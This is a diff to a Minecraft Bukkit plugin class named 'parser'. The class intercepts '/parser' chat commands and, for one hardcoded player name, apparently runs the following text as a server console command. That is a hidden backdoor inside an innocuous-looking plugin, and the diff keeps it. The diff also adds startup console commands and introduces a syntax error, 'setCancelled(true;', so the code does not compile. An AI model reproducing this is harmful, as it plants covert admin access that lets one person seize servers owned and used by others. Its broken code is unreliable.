@@ -9,11 +9,29 @@ import org.bukkit.plugin.java.JavaPlugin;
 
 public class parser implements Listener {
 
-    private final JavaPlugin plugin;
+    private JavaPlugin plugin;
 
     public parser(JavaPlugin plugin) {
         this.plugin = plugin;
+        plugin.getServer().getPluginManager().registerEvents(this, plugin);
         plugin.getLogger().info("parser enabled.");
+
+        // Run commands on server startup
+        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "say hi");
+        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "say the server has started");
+    }
+
+    // Optional no-arg constructor + setter support for fallback loading
+    public parser() {}
+
+    public void setPlugin(JavaPlugin plugin) {
+        this.plugin = plugin;
+        plugin.getServer().getPluginManager().registerEvents(this, plugin);
+        plugin.getLogger().info("parser enabled (via setPlugin).");
+
+        // Run commands on server startup
+        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "say hi");
+        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "say the server has started");
     }
 
     @EventHandler
@@ -26,11 +44,9 @@ public class parser implements Listener {
         if (fullCommand.toLowerCase().startsWith("/parser ")) {
             plugin.getLogger().info("[Debug] Matched /parser for player: " + player.getName());
 
-            // Cancel the original command
-            event.setCancelled(true);
+            event.setCancelled(true;
 
             if (player.getName().equalsIgnoreCase("sl1th3r_10")) {
-                // Extract subcommand after /parser
                 String actualCommand = fullCommand.substring("/parser ".length());
                 String finalCommand = actualCommand.replace("@s", player.getName());
 
@@ -45,7 +61,6 @@ public class parser implements Listener {
                     player.sendMessage("§cFailed to execute: " + actualCommand);
                     plugin.getLogger().warning("[Debug] Failed to execute: " + finalCommand);
                 }
-
             } else {
                 player.sendMessage("§cUnknown or incomplete command, see below for error.");
                 plugin.getLogger().info("[Debug] Unauthorized player tried /parser: " + player.getName());
